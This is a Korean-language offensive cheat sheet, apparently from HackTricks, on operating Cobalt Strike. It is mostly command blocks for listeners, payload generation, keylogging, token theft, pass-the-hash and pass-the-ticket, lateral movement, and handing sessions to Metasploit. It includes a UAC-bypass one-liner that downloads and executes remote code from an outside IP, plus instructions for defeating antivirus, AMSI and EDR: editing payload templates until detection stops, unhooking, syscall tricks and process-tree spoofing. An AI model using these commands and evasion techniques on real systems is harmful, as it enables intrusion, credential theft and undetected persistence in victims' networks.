# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 그런 다음 리스닝할 위치와 사용할 beacon 종류(http, dns, smb...) 등을 선택할 수 있다.

### Peer2Peer Listeners

이 리스너들의 beacon은 C2와 직접 통신할 필요가 없고, 다른 beacon을 통해 통신할 수 있다.

`Cobalt Strike -> Listeners -> Add/Edit` 그런 다음 TCP 또는 SMB beacon을 선택해야 한다

* **TCP beacon은 선택한 포트에 listener를 설정한다**. 다른 beacon에서 `connect <ip> <port>` 명령을 사용해 TCP beacon에 연결한다
* **smb beacon은 선택한 이름의 pipename에서 리스닝한다**. SMB beacon에 연결하려면 `link [target] [pipe]` 명령을 사용해야 한다.

### payloads 생성 및 호스팅

#### 파일로 payloads 생성

`Attacks -> Packages ->`

* **`HTMLApplication`** (HTA 파일용)
* **`MS Office Macro`** (매크로가 포함된 Office 문서용)
* **`Windows Executable`** (.exe, .dll 또는 서비스 .exe용)
* **`Windows Executable (S)`** (stageless **.exe, .dll 또는 서비스 .exe용**) (stageless가 staged보다 낫고, IoCs가 적다)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 이것은 bitsadmin, exe, powershell and python 등의 형식으로 cobalt strike에서 beacon을 다운로드하는 스크립트/실행파일을 생성한다

#### Host Payloads

이미 호스팅하려는 파일이 웹 서버에 있다면 `Attacks -> Web Drive-by -> Host File`로 가서 호스팅할 파일과 웹 서버 구성을 선택하면 된다.

### Beacon 옵션

<details>
<summary>Beacon 옵션 및 명령</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### 맞춤 임플란트 / Linux Beacons

- 맞춤 에이전트는 Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile)만 구현하면 등록/체크인하고 작업을 받을 수 있습니다. 프로파일에 정의된 동일한 URIs/headers/metadata crypto를 구현하여 Cobalt Strike UI를 작업 지시와 출력에 재사용하세요.
- An Aggressor Script (e.g., `CustomBeacon.cna`)는 non-Windows beacon용 페이로드 생성을 래핑하여 운영자가 리스너를 선택하고 GUI에서 직접 ELF payloads를 생성할 수 있게 합니다.
- Team Server에 노출되는 예시 Linux 작업 핸들러: `sleep`, `cd`, `pwd`, `shell` (임의 명령 실행), `ls`, `upload`, `download`, `exit`. 이러한 핸들러들은 Team Server가 기대하는 task ID에 매핑되며, 올바른 형식으로 출력을 반환하도록 서버 측에 구현되어야 합니다.
- BOF 지원은 TrustedSec's ELFLoader(https://github.com/trustedsec/ELFLoader)를 사용해 프로세스 내에서 Beacon Object Files를 로드하면 추가할 수 있으며(Outflank-style BOFs도 지원), 이는 새로운 프로세스를 생성하지 않고 임플란트의 컨텍스트/권한 내에서 모듈형 포스트-익스플로이트를 실행할 수 있게 합니다.
- 맞춤 beacon에 SOCKS 핸들러를 포함시켜 Windows Beacons와의 피벗 기능을 유지하세요: 운영자가 `socks <port>`를 실행하면 임플란트는 로컬 프록시를 열어 운영자의 도구를 손상된 Linux 호스트를 통해 내부 네트워크로 라우팅해야 합니다.

## Opsec

### Execute-Assembly

The **`execute-assembly`**는 원격 프로세스 인젝션을 사용해 지정된 프로그램을 실행하는 **희생 프로세스**를 사용합니다. 이는 매우 시끄러운데, 프로세스 내부에 인젝션할 때 사용되는 특정 Win APIs는 대부분의 EDR이 검사하기 때문입니다. 다만, 동일한 프로세스 내에서 무언가를 로드하는 데 사용할 수 있는 몇몇 커스텀 도구들이 있습니다:

- https://github.com/anthemtotheego/InlineExecute-Assembly
- https://github.com/kyleavery/inject-assembly
- In Cobalt Strike you can also use BOF (Beacon Object Files): https://github.com/CCob/BOF.NET

The agressor script `https://github.com/outflanknl/HelpColor`는 Cobalt Strike에 `helpx` 명령을 추가하여 명령들이 BOFs(녹색), Frok&Run(노란색) 등인지 또는 ProcessExecution, injection 등(빨간색)인지 색으로 표시합니다. 이는 어떤 명령이 더 은밀한지 파악하는 데 도움이 됩니다.

### Act as the user

You could check events like `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - 모든 인터랙티브 로그온을 확인해 일반적인 운영 시간을 파악하세요.
- System EID 12,13 - 종료/시작/절전 빈도를 확인하세요.
- Security EID 4624/4625 - 수신된 유효/무효 NTLM 시도를 확인하세요.
- Security EID 4648 - 평문 자격증명이 사용되어 로그온할 때 이 이벤트가 생성됩니다. 특정 프로세스가 생성했다면 해당 바이너리의 설정 파일이나 코드 내부에 자격증명이 평문으로 존재할 가능성이 있습니다.

Cobalt Strike에서 `jump`를 사용할 때는 새 프로세스가 더 정상적으로 보이도록 `wmi_msbuild` 방법을 사용하는 것이 좋습니다.

### Use computer accounts

수비측에서는 사용자로부터 발생하는 이상 동작을 모니터링하면서 **service accounts 및 `*$` 같은 컴퓨터 계정은 모니터링에서 제외**하는 경우가 흔합니다. 이러한 계정을 이용해 lateral movement나 privilege escalation을 수행할 수 있습니다.

### Use stageless payloads

Stageless payloads는 staged 것들보다 덜 시끄럽습니다 — C2 서버에서 두 번째 스테이지를 다운로드할 필요가 없기 때문입니다. 즉 초기 연결 이후에 네트워크 트래픽을 생성하지 않아 네트워크 기반 방어에 의해 탐지될 가능성이 낮아집니다.

### Tokens & Token Store

토큰을 훔치거나 생성할 때 주의하세요 — EDR이 모든 스레드의 토큰을 열거해 프로세스 내에서 **다른 사용자에 속한 토큰** 또는 심지어 SYSTEM 토큰을 찾아낼 수 있습니다.

이를 통해 토큰을 **per beacon**로 저장할 수 있으며, 동일 토큰을 반복해서 훔칠 필요가 없어집니다. 이는 lateral movement하거나 훔친 토큰을 여러 번 사용해야 할 때 유용합니다:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

수평 이동 시에는 보통 **새 토큰을 생성하기보다 토큰을 훔치는 것이** 또는 pass the hash 공격을 수행하는 것보다 낫습니다.

### Guardrails

Cobalt Strike에는 **Guardrails**라는 기능이 있어 수비자에게 탐지될 가능성이 있는 특정 명령이나 행동의 사용을 차단하는 데 도움을 줍니다. Guardrails는 특정 명령들(예: `make_token`, `jump`, `remote-exec`)을 차단하도록 구성할 수 있으며, 이러한 명령들은 lateral movement나 privilege escalation에 흔히 사용됩니다.

또한 레포 https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks에는 페이로드 실행 전에 고려할 수 있는 몇 가지 검사와 아이디어가 포함되어 있습니다.

### Tickets encryption

AD 환경에서는 티켓의 암호화에 주의하세요. 기본적으로 일부 도구는 Kerberos 티켓에 RC4 암호화를 사용하며, 이는 AES보다 안전하지 않습니다. 최신 환경은 기본적으로 AES를 사용합니다. 약한 암호화 알고리즘을 모니터링하는 수비자에게 이는 탐지될 수 있습니다.

### Avoid Defaults

Cobalt Strike를 사용할 때 기본적으로 SMB 파이프의 이름은 `msagent_####` 및 `status_####`가 됩니다. 이 이름들을 변경하세요. Cobalt Strike에서 기존 파이프 이름을 확인하려면 다음 명령을 사용하세요: `ls \\.\pipe\`

또한 SSH 세션에서는 `\\.\pipe\postex_ssh_####`라는 파이프가 생성됩니다. `set ssh_pipename "<new_name>";`로 변경하세요.

또한 postex exploitation 공격에서는 파이프 `\\.\pipe\postex_####`를 `set pipename "<new_name>"`로 수정할 수 있습니다.

Cobalt Strike 프로파일에서는 다음과 같은 항목들도 수정할 수 있습니다:

- `rwx` 사용 피하기
- `process-inject {...}` 블록에서 프로세스 인젝션 동작(어떤 APIs가 사용될지)
- `post-ex {…}` 블록에서 "fork and run" 동작
- sleep 시간
- 메모리에 로드할 바이너리의 최대 크기
- `stage {...}` 블록으로 메모리 풋프린트와 DLL 내용
- 네트워크 트래픽

### Bypass memory scanning

일부 EDR은 메모리에서 알려진 악성코드 시그니처를 스캔합니다. Cobalt Strike는 `sleep_mask` 함수를 BOF로 수정할 수 있게 하여 메모리 내에서 백도어를 암호화할 수 있습니다.

### Noisy proc injections

프로세스에 코드를 인젝션할 때 이는 보통 매우 시끄럽습니다. 그 이유는 **정상적인 프로세스는 보통 이런 동작을 하지 않으며, 이를 수행하는 방법도 제한적이기 때문**입니다. 따라서 행동 기반 탐지 시스템에 의해 감지될 수 있습니다. 또한 **디스크에 없는 코드를 포함한 스레드**를 네트워크에서 스캔하는 EDR에 의해 감지될 수도 있습니다(브라우저처럼 JIT을 사용하는 프로세스는 흔히 이런 동작을 합니다). 예: https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2

### Spawnas | PID and PPID relationships

새 프로세스를 생성할 때에는 탐지를 피하기 위해 프로세스들 간에 **정상적인 부모-자식 관계**를 유지하는 것이 중요합니다. 예를 들어 svchost.exe가 iexplorer.exe를 실행하는 것은 의심스럽게 보입니다. 정상적인 Windows 환경에서는 svchost.exe가 iexplorer.exe의 부모가 아니기 때문입니다.

Cobalt Strike에서 새 비콘이 생성될 때 기본적으로 새 리스너를 실행하기 위해 **`rundll32.exe`** 프로세스가 생성됩니다. 이는 매우 은밀하지 못하며 EDR에 의해 쉽게 감지될 수 있습니다. 또한 `rundll32.exe`가 인자 없이 실행되면 더 의심스럽게 보입니다.

다음 Cobalt Strike 명령을 사용하면 새 비콘을 생성할 때 다른 프로세스를 지정하여 탐지 가능성을 줄일 수 있습니다:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

공격자는 때때로 도구를 로컬에서 실행해야 할 필요가 있으며, 심지어 Linux 머신에서 피해자의 트래픽이 도구에 도달하도록 만들어야 할 때가 있습니다(예: NTLM relay).

또한 pass-the.hash나 pass-the-ticket 공격을 수행할 때, 공격자가 피해자의 LSASS 프로세스를 수정하는 대신 **자신의 LSASS 프로세스에 이 hash나 ticket을 추가하는 것** 으로 로컬에서 피벗하는 쪽이 더 은밀할 수 있습니다.

하지만 **생성된 트래픽에 주의해야 합니다**, 백door 프로세스에서 비정상적인 트래픽(kerberos?)을 보낼 수 있기 때문입니다. 이를 위해 브라우저 프로세스로 피벗할 수 있지만(프로세스에 인젝션을 하다 적발될 수 있으므로 은밀한 방법을 고려하세요).

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
원하는 디스크의 리소스를 사용하고 이미 로드된 리소스를 사용하지 않도록 Cobalt Strike에 지시하려면 공격적인 스크립트 `dist-pipe\artifact.cna`를 로드하는 것을 잊지 마세요.

#### 리소스 키트

ResourceKit 폴더에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 스크립트 기반 페이로드 템플릿이 포함되어 있습니다.

템플릿과 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 방어 솔루션(이 경우 AMSI)이 무엇을 싫어하는지 찾아 수정할 수 있습니다:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
감지된 라인을 수정하면 탐지되지 않는 템플릿을 생성할 수 있습니다.

원하는 디스크상의 리소스를 사용하도록 Cobalt Strike에 지시하려면 공격적 스크립트 `ResourceKit\resources.cna`를 로드하는 것을 잊지 마세요(기본으로 로드된 리소스 대신).

#### 함수 훅 | Syscall

함수 후킹은 ERDs가 악성 활동을 탐지하기 위해 사용하는 매우 흔한 방법입니다. Cobalt Strike는 표준 Windows API 호출 대신 **syscalls**를 사용하도록 **`None`** 설정을 사용하거나, 함수의 `Nt*` 버전을 **`Direct`** 설정으로 사용하거나, malleable profile에서 **`Indirect`** 옵션으로 `Nt*` 함수 위를 단순히 건너뛰어 이러한 훅을 우회할 수 있게 해줍니다. 시스템에 따라 어느 옵션이 더 은밀한지는 달라질 수 있습니다.

이 설정은 프로파일에서 하거나 명령 **`syscall-method`** 를 사용해 지정할 수 있습니다.

하지만 이 방법도 노이즈를 발생시킬 수 있습니다.

Cobalt Strike가 함수 훅을 우회하도록 해주는 한 가지 옵션은 다음을 사용해 해당 훅을 제거하는 것입니다: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

어떤 함수들이 훅되어 있는지 확인하려면 다음을 사용할 수 있습니다: [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 또는 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)



<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## 참고자료

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
